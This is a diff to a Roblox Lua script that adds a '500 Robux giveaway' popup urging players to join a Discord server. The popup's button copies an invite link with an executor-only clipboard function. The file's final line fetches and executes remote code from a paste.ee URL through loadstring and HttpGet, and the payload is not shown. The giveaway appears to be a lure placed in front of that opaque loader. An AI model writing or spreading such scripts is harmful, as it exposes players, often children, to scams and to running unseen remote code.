@@ -1,1 +1,159 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "PremiumGiveawayGUI"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 350, 0, 220)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+mainFrame.BackgroundTransparency = 1
+mainFrame.Parent = gui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(80, 80, 90)
+stroke.Thickness = 2
+stroke.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Text = "🎉 500 ROBUX GIVEAWAY! 🎉"
+title.Size = UDim2.new(1, -40, 0, 40)
+title.Position = UDim2.new(0, 20, 0, 15)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 215, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = mainFrame
+
+local desc = Instance.new("TextLabel")
+desc.Text = "I'm giving away 500 Robux when my channel hits 10k subscribers!\n\nJoin our Discord server below to enter the giveaway:"
+desc.Size = UDim2.new(1, -40, 0, 80)
+desc.Position = UDim2.new(0, 20, 0, 55)
+desc.BackgroundTransparency = 1
+desc.TextColor3 = Color3.fromRGB(220, 220, 220)
+desc.Font = Enum.Font.Gotham
+desc.TextSize = 14
+desc.TextWrapped = true
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.Parent = mainFrame
+
+local discordButton = Instance.new("TextButton")
+discordButton.Text = "JOIN DISCORD"
+discordButton.Size = UDim2.new(1, -40, 0, 40)
+discordButton.Position = UDim2.new(0, 20, 0, 150)
+discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordButton.Font = Enum.Font.GothamBold
+discordButton.TextSize = 14
+discordButton.AutoButtonColor = false
+discordButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = discordButton
+
+local buttonStroke = Instance.new("UIStroke")
+buttonStroke.Color = Color3.fromRGB(140, 150, 255)
+buttonStroke.Thickness = 2
+buttonStroke.Parent = discordButton
+
+local closeButton = Instance.new("TextButton")
+closeButton.Text = "❌"
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+closeButton.TextColor3 = Color3.fromRGB(220, 220, 220)
+closeButton.Font = Enum.Font.GothamBold
+closeButton.TextSize = 16
+closeButton.Visible = false
+closeButton.Parent = mainFrame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(1, 0)
+closeCorner.Parent = closeButton
+
+local function tweenIn()
+	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+	TweenService:Create(mainFrame, tweenInfo, {BackgroundTransparency = 0}):Play()
+end
+
+local function tweenOut()
+	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+	local tween = TweenService:Create(mainFrame, tweenInfo, {BackgroundTransparency = 1})
+	tween:Play()
+	tween.Completed:Wait()
+	gui:Destroy()
+end
+
+discordButton.MouseEnter:Connect(function()
+	TweenService:Create(discordButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 115, 255)}):Play()
+end)
+
+discordButton.MouseLeave:Connect(function()
+	TweenService:Create(discordButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
+end)
+
+discordButton.MouseButton1Click:Connect(function()
+	setclipboard("https://discord.com/invite/aN8n58FgyD")
+	local originalText = discordButton.Text
+	discordButton.Text = "COPIED TO CLIPBOARD!"
+	task.wait(2)
+	discordButton.Text = originalText
+end)
+
+closeButton.MouseButton1Click:Connect(tweenOut)
+
+local dragStart
+local startPos
+
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragStart = input.Position
+		startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragStart = nil
+			end
+		end)
+	end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragStart then
+			updateInput(input)
+		end
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragStart and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		updateInput(input)
+	end
+end)
+
+task.spawn(function()
+	tweenIn()
+	task.wait(3)
+	closeButton.Visible = true
+end)
+
+wait(3)
 loadstring(game:HttpGet("https://paste.ee/r/ZM1yrAOE/0", true))()
